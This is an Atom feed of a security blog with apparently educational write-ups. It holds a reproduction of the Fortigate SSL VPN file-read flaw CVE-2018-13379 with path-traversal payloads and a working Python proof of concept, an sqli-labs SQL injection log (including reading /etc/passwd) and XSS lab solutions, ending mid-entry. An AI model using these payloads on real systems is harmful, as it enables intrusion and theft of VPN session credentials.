<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>danta</title>
  
  
  <link href="/atom.xml" rel="self"/>
  
  <link href="https://cxliker.github.io/"/>
  <updated>2019-08-21T02:52:23.462Z</updated>
  <id>https://cxliker.github.io/</id>
  
  <author>
    <name>danta</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>å…³äºfortigate ssl vpn CVE-2018-13379çš„ä¸€äº›é—®é¢˜</title>
    <link href="https://cxliker.github.io/2019/08/21/the-problem-about-fortigate-ssl-vpn-CVE-2018-13379/"/>
    <id>https://cxliker.github.io/2019/08/21/the-problem-about-fortigate-ssl-vpn-CVE-2018-13379/</id>
    <published>2019-08-21T02:14:52.000Z</published>
    <updated>2019-08-21T02:52:23.462Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2018-13379-Fortigate-SSL-VPN-æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–"><a href="#CVE-2018-13379-Fortigate-SSL-VPN-æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–" class="headerlink" title="CVE-2018-13379: Fortigate SSL VPN æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–"></a><a href="https://fortiguard.com/psirt/FG-IR-18-384" target="_blank" rel="noopener">CVE-2018-13379</a>: Fortigate SSL VPN æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–</h1><p>Orange Tsai(<a href="https://twitter.com/orange_8361" target="_blank" rel="noopener">@orange_8361</a>)å¸ˆå‚…åœ¨<a href="https://blog.orange.tw/2019/08/attacking-ssl-vpn-part-2-breaking-the-fortigate-ssl-vpn.html" target="_blank" rel="noopener">åšå®¢</a>ä¸­å…¬å¸ƒäº†å…³äºFortigate SSL VPNçš„ä¼—å¤šæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ªæ˜¯ä»»æ„æ–‡ä»¶è¯»å–æ¼æ´ï¼Œå¹¶å…¬å¸ƒäº†<a href="https://github.com/milo2012/CVE-2018-13379" target="_blank" rel="noopener">PoC</a>ï¼Œä½†æ˜¯ç›¸å…³ç»†èŠ‚æ²¡æœ‰è¯´å¤ªå¤šï¼Œåœ¨æ­¤è®°å½•ä¸€ä¸‹è‡ªå·±åœ¨å¤ç°è¿‡ç¨‹ä¸­é‡åˆ°çš„é—®é¢˜ã€‚</p><h2 id="ä»»æ„æ–‡ä»¶è·¯å¾„æ„é€ "><a href="#ä»»æ„æ–‡ä»¶è·¯å¾„æ„é€ " class="headerlink" title="ä»»æ„æ–‡ä»¶è·¯å¾„æ„é€ "></a>ä»»æ„æ–‡ä»¶è·¯å¾„æ„é€ </h2><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">snprintf</span>(s, <span class="number">0x40</span>, <span class="string">"/migadmin/lang/%s.json"</span>, lang);</span><br></pre></td></tr></table></figure><p><code>snprintf</code>æ–¹æ³•æŒ‡å®šäº†è¯»å–å­—ç¬¦ä¸²çš„æœ€å¤§é•¿åº¦ä¸º0x40ï¼Œä¹Ÿå°±æ˜¯64ä¸ªå­—ç¬¦ï¼Œå¦‚æœè¶…å‡º64ä¸ªå­—ç¬¦å°±ä¼šå‘ç”Ÿæº¢å‡ºæˆªæ–­ã€‚æˆ‘ä»¬éœ€è¦é€šè¿‡è¿™ä¸ªçš„æ–¹æ³•æˆªæ–­<code>.json</code>åç¼€ã€‚ç®—ä¸ŠåŸæœ¬å·²ç»æœ‰çš„<code>/migadmin/lang/</code>å 15ä¸ªå­—ç¬¦ï¼Œè¿˜æœ‰å­—ç¬¦ä¸²æœ€åçš„ç»“æŸæ ‡å¿—<code>\0</code>ï¼Œæˆ‘ä»¬æ„é€ çš„payloadé•¿åº¦åº”ä¸º48ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">/../../../..//////////dev/cmdb/sslvpn_websession</span><br><span class="line">/../../../../../../../..////////////proc/version</span><br><span class="line">/../../../../../../../..////////proc/self/mounts</span><br></pre></td></tr></table></figure><p><img src="/image/5.jpg" alt></p><h2 id="PoCç¼–å†™"><a href="#PoCç¼–å†™" class="headerlink" title="PoCç¼–å†™"></a>PoCç¼–å†™</h2><p>å½“å¼€å§‹ç€æ‰‹å†™PoCçš„æ—¶å€™å‘ç°ï¼Œå¹¶ä¸èƒ½æ­£ç¡®è·å–è¿”å›çš„æ•°æ®ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">import</span> requests</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>url = xxx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>headers = xxx</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>rsp = requests.get(url, headers=headers, verify=<span class="literal">False</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>print(rsp.content)</span><br><span class="line"><span class="string">'var fgt_lang = \n'</span></span><br></pre></td></tr></table></figure><p>æ¢äº†å„ç§å§¿åŠ¿æ­»æ´»æ‹¿ä¸åˆ°æ•°æ®ï¼Œå¯ä»¥çœ‹åˆ°<code>var fgt_lang = \n</code>çš„é•¿åº¦æ­£å¥½æ˜¯16ï¼Œè€Œå›¾ä¸­è¿”å›çš„responseä¸­çš„Content-Lengthä¹Ÿæ­£å¥½æ˜¯16ï¼Œè¿™è¯´æ˜æ˜¯è¿”å›çš„åŒ…è¢«æˆªæ–­äº†ã€‚ä½†æ˜¯ä¸ºä»€ä¹ˆBurpåˆèƒ½æ‹¿åˆ°æ•°æ®å‘¢ï¼Ÿ</p><p>å’¨è¯¢äº†ä¸€ä¸‹å¤§ä½¬åæ˜ç™½ï¼ŒBurpç”¨çš„æ˜¯raw socketåè®®è¯»å–çš„æ•°æ®ï¼Œæ— è„‘è¯»ï¼Œç›´åˆ°æ”¶ä¸åˆ°æ•°æ®ä¸ºæ­¢ã€‚</p><p>ç®€å•å­¦ä¹ äº†ä¸€ä¸‹raw socketåç»ˆäºæ‹¿åˆ°äº†è¿”å›çš„æ•°æ®äº†ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> ssl</span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line"></span><br><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'your-ip'</span>, your-port))</span><br><span class="line">s = ssl.wrap_socket(s, keyfile=<span class="literal">None</span>, certfile=<span class="literal">None</span>, server_side=<span class="literal">False</span>, cert_reqs=ssl.CERT_NONE, ssl_version=ssl.PROTOCOL_SSLv23)</span><br><span class="line">s.sendall(<span class="string">"GET /remote/fgt_lang?lang=/../../../../../../../..////////////proc/version HTTP/1.1\r\nHost: your-ip:your-port\r\nConnection: close\r\nUser-Agent: Mozilla/5.0\r\nContent-Length: 0\r\n\r\n"</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line"></span><br><span class="line">    new = s.recv(<span class="number">4096</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> new:</span><br><span class="line">      s.close()</span><br><span class="line">      <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> new</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;CVE-2018-13379-Fortigate-SSL-VPN-æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–&quot;&gt;&lt;a href=&quot;#CVE-2018-13379-Fortigate-SSL-VPN-æœªæˆæƒä»»æ„æ–‡ä»¶è¯»å–&quot; class=&quot;headerlink&quot; title=&quot;CVE-2018
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>sqli-labsæŒ‘æˆ˜è®°å½•</title>
    <link href="https://cxliker.github.io/2018/02/08/sqli-labs%E6%8C%91%E6%88%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://cxliker.github.io/2018/02/08/sqli-labsæŒ‘æˆ˜è®°å½•/</id>
    <published>2018-02-08T13:17:13.000Z</published>
    <updated>2018-02-23T12:25:36.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p><a href="https://github.com/Audi-1/sqli-labs" target="_blank" rel="noopener">sqli-labs</a>æ˜¯Githubä¸Šä¸€ä¸ªå°åº¦å¤§å”<a href="https://github.com/Audi-1" target="_blank" rel="noopener">Audi-1</a>çš„ä¸€ä¸ªé¡¹ç›®ï¼Œç”¨PHPå’ŒMySQLæ­å»ºçš„ä¸€ä¸ªå­¦ä¹ SQLIæ³¨å…¥çš„å®éªŒå¹³å°ã€‚å°åº¦å¤§å”æœ‰äº²è‡ªè‡ªå·±å½•è¿‡æ•™å­¦è§†é¢‘ï¼Œåªæ˜¯å£éŸ³æœ‰ç‚¹é‡ï¼Œæ”¾åœ¨äº†Youtubeä¸Šé¢ï¼ˆ<a href="https://www.youtube.com/playlist?list=PLkiAz1NPnw8qEgzS7cgVMKavvOAdogsro" target="_blank" rel="noopener">è¿™é‡Œ</a>ï¼‰ã€‚æˆ‘åœ¨æ­¤è®°å½•ä¸€ä¸‹å­¦ä¹ è¿‡ç¨‹ä¸­çš„ä¸œè¥¿ï¼Œæ¬¢è¿äº¤æµã€‚       </p><h1 id="Less-1-4"><a href="#Less-1-4" class="headerlink" title="Less 1 - 4"></a>Less 1 - 4</h1><p>å½“æ‰¾åˆ°æ³¨å…¥ç‚¹çš„æ—¶å€™ï¼Œå¯ä»¥ç”¨order by 1/2/3æ¥çŸ¥é“selectä¸­å…±æœ‰å¤šå°‘åˆ—ã€‚å¦‚æœorder by ä¸ç®¡ç”¨ï¼Œå¯ä»¥ç”¨union select 1,2,3æ¥åˆ¤æ–­ï¼Œå› ä¸ºunionè¦æ±‚å·¦å³ä¸¤å¼ è¡¨æ˜¯ä¸€æ ·çš„åˆ—æ•°ã€‚</p><p>å½“é¡µé¢ä¸æ˜¾ç¤ºæ•°æ®è¿”å›çš„ç»“æœï¼Œä½†æ˜¯æœ‰é”™è¯¯æç¤ºï¼Œå¯ä»¥åˆ©ç”¨é”™è¯¯æç¤ºå°†æ•°æ®dumpå‡ºæ¥</p><p>select concat((select database()))</p><p>åŸç†è§£é‡Š<a href="http://www.cnblogs.com/xdans/p/5412468.html" target="_blank" rel="noopener">MysqlæŠ¥é”™æ³¨å…¥åŸç†åˆ†æ(count()ã€rand()ã€group by)</a><br>select count(<em>), concat(0x3a,0x3a,(select user()),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a;<br>ç¾åŒ–ç‰ˆ<br>SELECT<br>    count(</em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (SELECT USER()),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) * 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;</p><p>æ‰€ä»¥å¯ä»¥è¿›é˜¶ä¸€ä¸‹ï¼ŒæŸ¥çœ‹æ›´å¤šä¿¡æ¯<br>select count(<em>), concat(0x3a,0x3a,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x3a,0x3a,floor(rand(0)*2))a from information_schema.tables group by a;<br>ç¾åŒ–ç‰ˆ<br>SELECT<br>    count(</em>),<br>    concat(<br>        0x3a,<br>        0x3a,<br>        (<br>            SELECT<br>                table_name  //æ­¤å¤„æ— æ³•ç”¨group_concat<br>            FROM<br>                information_schema. TABLES<br>            WHERE<br>                table_schema = DATABASE ()<br>            LIMIT 0,<br>            1<br>        ),<br>        0x3a,<br>        0x3a,<br>        floor(rand(0) * 2)<br>    ) a<br>FROM<br>    information_schema. TABLES<br>GROUP BY<br>    a;<br>æ”¹å˜limitå°±å¯ä»¥éå†äº†ï¼Œä½†æ˜¯å­æŸ¥è¯¢ä¸­ä¸çŸ¥é“ä¸ºä»€ä¹ˆç”¨group_concatå°±ä¸ä¼šé”™è¯¯ï¼Œæ‰€ä»¥åªèƒ½ä¸€ä¸ªä¸ªæ”¹å˜limitæ¥ã€‚</p><p>ä»¥ä¸‹è¿˜æœ‰ä¸¤ç§æ–¹å¼ä¹Ÿæ˜¯ä¸€æ ·çš„æ•ˆæœã€‚<br> select min(@a:=1) from information_schema.tables group by concat(version(),@a:=(@a+1)%2)</p><p> select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x;</p><p> å½“ä¸èƒ½ä½¿ç”¨select * from çš„æ—¶å€™ï¼Œæ¯”å¦‚åé¢æœ‰and è¯­å¥ã€‚å¯ä»¥ç”¨ç›²æ³¨ã€‚</p><h1 id="less-8"><a href="#less-8" class="headerlink" title="less-8"></a>less-8</h1><p> ç›²æ³¨ï¼Œè¿™ç§æƒ…å†µæ²¡æœ‰é”™è¯¯ææ—¶ï¼Œåªèƒ½é€šè¿‡true and falseæ¥åˆ¤æ–­ã€‚<br> éœ€è¦å€ŸåŠ©çš„å‡½æ•°æ˜¯ ascii(), substr(), length() è¿™æ ·æ¥æšä¸¾ä¸€ä¸ªå­—ç¬¦ä¸²çš„é•¿åº¦ï¼Œæ¯ä¸€ä¸ªå­—æ¯æ¥è·å–éœ€è¦çš„ä¿¡æ¯ã€‚<br> æ¯”å¦‚<br> <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(database(), 3, 1)) &lt;100 </span><br><span class="line">and ascii(substr((select table_name for information_schema.tables limit 1), 3 ,1)) &lt; 100</span><br></pre></td></tr></table></figure></p><h1 id="less-9"><a href="#less-9" class="headerlink" title="less-9"></a>less-9</h1><p>ä¸Šä¸€é¢˜çš„ç›²æ³¨æ˜¯åŸºäºçœŸå‡å€¼å¾—ã€‚ä½†æ˜¯è¿™ä¸€é¢˜çš„sqlç»“æœæ— è®ºæ˜¯å¦å­˜åœ¨ä¸å¦ï¼Œç½‘é¡µå‰ç«¯éƒ½æ˜¯åŒä¸€ä¸ªæ•ˆæœï¼Œæ‰€ä»¥æˆ‘ä»¬è¿™ä¸€é¢˜çš„ç›²æ³¨è¦é€šè¿‡ä¸€ä¸ªå°æŠ€å·§ï¼Œå«åšæ—¶é—´ç›²æ³¨ã€‚è¦ç”¨åˆ°sleep()å‡½æ•°ã€‚<br>å¯ä»¥æ„é€ æ„é€ å¦‚ä¸‹çš„payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">select ascii(substr(databse(), 3,1 )) = 90 and sleep(10)</span><br><span class="line">select if((select database())=&quot;security&quot;, sleep(10), null)</span><br><span class="line">select if((select database() like &quot;sec%&quot;), sleep(10), null)</span><br></pre></td></tr></table></figure><p>å‡å¦‚ç¬¬ä¸€ä¸ªå­—æ¯æ˜¯æ­£ç¡®çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬ç½‘é¡µå°±ç­‰ç­‰å¾…10ç§’æ‰è¿”å›ç»“æœï¼Œå¦‚æœé”™è¯¯å°±ç«‹å³è¿”å›äº†ã€‚é€šè¿‡è¿™ä¸¤ä¸ªæ—¶é—´çš„å·®è·ï¼Œæˆ‘ä»¬å°±å¯ä»¥åˆ¤æ–­ã€‚</p><h1 id="using-outfile-lesst-7"><a href="#using-outfile-lesst-7" class="headerlink" title="using outfile (lesst-7)"></a>using outfile (lesst-7)</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">select * from users into outfile &quot;/tmp/test.txt&quot;</span><br><span class="line">select * from users limit 1 into dumpfile &quot;/tmp/test.txt&quot;</span><br></pre></td></tr></table></figure><p>outfileå¯ä»¥å¤šè¡Œï¼Œdumpfileåªèƒ½ä¸€è¡Œ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">select load_file(&quot;/etc/passwd&quot;) into outfile &quot;/tmp/test.txt&quot;</span><br><span class="line">``` </span><br><span class="line">è·¯å¾„åä¸€èˆ¬ç”¨ç½‘ç«™çš„ç›®å½•ï¼Œè‡³äºç½‘ç«™çš„ç›®å½•å°±ç”¨å…¶ä»–æ–¹æ³•æ¥çŒœæµ‹å’Œç¡®å®šã€‚</span><br><span class="line"></span><br><span class="line"># less-12</span><br><span class="line">ä»11å¼€å§‹ï¼Œå°±æ˜¯postæ–¹æ³•çš„æ³¨å…¥äº†ã€‚</span><br><span class="line">è¿™é‡Œä¹Ÿæ˜¯åŸºäºé¡µé¢çš„Mysqlé”™è¯¯æç¤ºæ¥çŒœæµ‹SQLçš„å†™æ³•ã€‚</span><br><span class="line"></span><br><span class="line"># less 14</span><br><span class="line">å› ä¸ºè¿™é‡ŒæˆåŠŸç™»å…¥ä¹‹åæ²¡æœ‰ä»»ä½•æœ‰ç”¨çš„ä¿¡æ¯è¿”å›ï¼Œä½†æ˜¯é”™è¯¯SQLçš„æ—¶å€™é¡µé¢ä¼šæœ‰é”™è¯¯æç¤ºï¼Œæ‰€ä»¥æˆ‘ä»¬è¦ç”¨åŒé‡æ³¨å…¥ã€‚</span><br></pre></td></tr></table></figure><p>â€œ and (select 1 from (select count(<em>), (concat(â€œ<del>â€œ,version(),â€</del>â€œ,floor(rand(0)</em>2)))c from information_schema.tables GROUP BY c)a) # </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"># less 16</span><br><span class="line">è¿™é¢˜æ˜¯ç›²æ³¨</span><br><span class="line"></span><br><span class="line"># less 17</span><br></pre></td></tr></table></figure><p>update users set password=â€™$psdâ€™ where username=â€™$unameâ€™</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">è¿™é¢˜å°±éœ€è¦ç”¨åŒé‡æ³¨å…¥</span><br><span class="line"></span><br><span class="line"># less 18</span><br></pre></td></tr></table></figure><p> â€˜::1â€™, â€˜adminâ€™)â€™ at line 1<br> insert into uagents (agents, ip , uname) value(â€˜â€™, â€˜â€™, â€˜adminâ€™)<br> insert into uagents(agent, ip, uname) value(â€˜â€™ or 1 = â€˜1â€™, â€˜::1â€™, â€˜adminâ€™)</p><p> ```<br> è¿™é‡Œåº”è¯¥ç”¨åŒé‡æ³¨å…¥</p><h1 id="less-20"><a href="#less-20" class="headerlink" title="less 20"></a>less 20</h1><p> åŸºäºcookieçš„æ³¨å…¥ï¼Œ è¿™é‡Œå…¶å®ä¹Ÿå°±æ˜¯å¦ä¸€ç§å½¢å¼çš„åŸºäºé”™è¯¯çš„æ³¨å…¥ã€‚</p><h1 id="less-21"><a href="#less-21" class="headerlink" title="less 21"></a>less 21</h1><p> å’Œä¸Šé¢ä¸€æ ·ï¼Œåªæ˜¯åŠ å¤šä¸€é“åŠ å¯†çš„è¿‡ç¨‹ã€‚</p><h1 id="æœ‰è¶£å°çŸ¥è¯†"><a href="#æœ‰è¶£å°çŸ¥è¯†" class="headerlink" title="æœ‰è¶£å°çŸ¥è¯†"></a>æœ‰è¶£å°çŸ¥è¯†</h1><ol><li>å¯ä»¥é€šè¿‡ä¸€ä¸ªæœ‰è¶£çš„å°æµ‹è¯•æ¥è¯†åˆ«æ˜¯å¦å­˜åœ¨å•å¼•å·æ¼æ´ï¼š<br>å‘WebæœåŠ¡å™¨å‘é€ä¸‹é¢ä¸¤ä¸ªè¯·æ±‚ï¼š<br> a.  <a href="http://www.victim.com/showproducts.php?category=bikes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bikes</a><br> b.  <a href="http://www.victim.com/showproducts.php?category=bi&#39;||&#39;kes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bi&#39;||&#39;kes</a><br>åœ¨Microsoft SQL Serverä¸­ä¸ä¹‹ç­‰ä»·çš„è¯·æ±‚ä¸ºï¼š<br> a.  <a href="http://www.victim.com/showproducts.php?category=bikes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bikes</a><br> b.  <a href="http://www.victim.com/showproducts.php?category=bi&#39;+&#39;kes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bi&#39;+&#39;kes</a><br>åœ¨MYSQLä¸­ä¸ä¹‹ç­‰ä»·çš„è¯·æ±‚ä¸ºï¼ˆè¯·æ³¨æ„ä¸¤ä¸ªå•å¼•å·ä¹‹é—´çš„ç©ºæ ¼ï¼‰ï¼š<br> a.  <a href="http://www.victim.com/showproducts.php?category=bikes" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bikes</a><br> b.  <a href="http://www.victim.com/showproducts.php?category=bi&#39;" target="_blank" rel="noopener">http://www.victim.com/showproducts.php?category=bi&#39;</a> â€˜kes<br>å¦‚æœä¸¤ä¸ªè¯·æ±‚çš„ç»“æœç›¸åŒï¼Œé‚£ä¹ˆå¾ˆå¯èƒ½å­˜åœ¨SQLæ³¨å…¥æ¼æ´ã€‚</li></ol>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;å‰è¨€&quot;&gt;&lt;a href=&quot;#å‰è¨€&quot; class=&quot;headerlink&quot; title=&quot;å‰è¨€&quot;&gt;&lt;/a&gt;å‰è¨€&lt;/h1&gt;&lt;p&gt;&lt;a href=&quot;https://github.com/Audi-1/sqli-labs&quot; target=&quot;_blank&quot; rel=&quot;noo
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>XSSç»ƒä¹ :alf.nu/alert1 Write-ups</title>
    <link href="https://cxliker.github.io/2018/01/29/XSS%E7%BB%83%E4%B9%A0-alf-nu-alert1-Write-ups/"/>
    <id>https://cxliker.github.io/2018/01/29/XSSç»ƒä¹ -alf-nu-alert1-Write-ups/</id>
    <published>2018-01-29T09:26:26.000Z</published>
    <updated>2018-01-30T08:55:38.000Z</updated>
    
    <content type="html"><![CDATA[<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>è¿™äº›å¤©åœ¨<a href="https://alf.nu/alert1" target="_blank" rel="noopener">alf.nu/alert1</a>ä¸Šåšäº†XSSç»ƒä¹ é¢˜ï¼Œç›®å‰å¤§éƒ¨åˆ†åšå‡ºæ¥äº†ï¼Œä½†æœ‰äº›é¢˜ç›®å¹¶ä¸æ˜¯æœ€ä¼˜è§£ã€‚è¿˜å‰©ä¸‹2é“é¢˜æ²¡æœ‰åšå‡ºï¼ˆFruit3, Qunieï¼‰ï¼Œåœ¨æ­¤åšä¸ªè®°å½•ã€‚æ¬¢è¿å¤§å®¶äº¤æµã€‚</p><a id="more"></a><h1 id="Warmup"><a href="#Warmup" class="headerlink" title="Warmup"></a>Warmup</h1><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span>+s+<span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¯¹è¾“å…¥æ²¡æœ‰é™åˆ¶ï¼Œåªè¦é—­åˆæ‰console.logå³å¯ã€‚<br>solution(12 chars): <code>&quot;);alert(1,&quot;</code><br><br><br><br><br></p><h1 id="Adobe"><a href="#Adobe" class="headerlink" title="Adobe"></a>Adobe</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = s.replace(<span class="regexp">/"/g</span>, <span class="string">'\\"'</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log("'</span> + s + <span class="string">'");&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜escapeå°†è¾“å…¥çš„å¼•å·<code>&quot;</code>è½¬æ¢ä¸ºäº†<code>\\&quot;</code>ï¼Œä½¿å¾—å¼•å·å˜æˆäº†å­—é¢é‡ï¼Œä¸Šä¸€é¢˜çš„æ–¹æ³•æ— æ•ˆäº†ã€‚ä¸è¿‡å¦‚æœè¾“å…¥ä¸º<code>\&quot;</code>ï¼Œé‚£ä¹ˆå°±ä¼šè½¬æ¢ä¸º<code>\\\&quot;</code>ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œæœ¬æ¥æ˜¯è½¬ä¹‰å¼•å·çš„ï¼Œä½†å˜æˆäº†è½¬ä¹‰åæ–œæ†äº†ï¼Œä»è€Œå¼•å·å¯ä»¥é€ƒè„±è½¬ä¹‰äº†ã€‚<br>solution(14 chars): <code>\&quot;);alert(1)//</code><br><br><br><br><br></p><h1 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  s = <span class="built_in">JSON</span>.stringify(s);</span><br><span class="line">  <span class="keyword">return</span> <span class="string">'&lt;script&gt;console.log('</span> + s + <span class="string">');&lt;/script&gt;'</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>è¿™é¢˜å¯¹è¾“å…¥çš„å­—ç¬¦ä¸²ç”¨äº†<code>JSON.stringify()</code>(<a href="https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/JSON/stringify" target="_blank" rel="noopener">ç›¸å…³ä»‹ç»</a>)æ¥å¤„ç†å­—ç¬¦ä¸²ã€‚ç®€å•æ¥è¯´ï¼Œå°±æ˜¯è¿‡æ»¤äº†<code>\</code>,<code>&quot;</code>ç­‰å­—ç¬¦ï¼Œåˆ†åˆ«è½¬åŒ–ä¸º<code>\\</code>,<code>\&quot;</code>ç­‰ï¼Œä½†æ²¡æœ‰è¿‡æ»¤<code>&lt;</code>,<code>&gt;</code>,<code>/</code>å­—ç¬¦ï¼Œè¿™å°±å¤Ÿç”¨äº†ã€‚æ—¢ç„¶é—­åˆä¸äº†<code>log</code>å‡½æ•°ï¼Œé‚£å°±é—­åˆ<code>script</code>æ ‡ç­¾å§<br>solution(27 chars): <code>&lt;/script&gt;&lt;script&gt;alert(1)//</code><br><br><br><br><br></p><h1 id="JavaScript"><a href="#JavaScript" class="headerlink" title="JavaScript"></a>JavaScript</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> url = <span class="string">'javascript:console.log('</span> + <span class="built_in">JSON</span>.stringify(s) + <span class="string">')'</span>;</span><br><span class="line">  <span class="built_in">console</span>.log(url);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> a = <span class="built_in">document</span>.createElement(<span class="string">'a'</span>);</span><br><span class="line">  a.href = url;</span><br><span class="line">  <span class="built_in">document</span>.body.appendChild(a);</span><br><span class="line">  a.click();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>åŒæ ·å› ä¸º<code>JSON.stringify()</code>çš„åŸå› æ²¡åŠæ³•ç”¨ç›´æ¥ç”¨<code>&quot;</code>ï¼Œä½†æ˜¯ç”±äºè¿™æ¬¡æ³¨å…¥çš„åœ°æ–¹æ˜¯urlï¼Œæ‰€ä»¥å¯ä»¥ç”¨URLç¼–ç çš„åŠæ³•è®²<code>&quot;</code>è½¬æ¢ä¸º<code>%22</code>ã€‚<br>solution(15 chars): <code>%22);alert(1)//</code><br><br><br><br><br></p><h1 id="Markdown"><a href="#Markdown" class="headerlink" title="Markdown"></a>Markdown</h1><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">escape</span>(<span class="params">s</span>) </span>&#123;</span><br><span 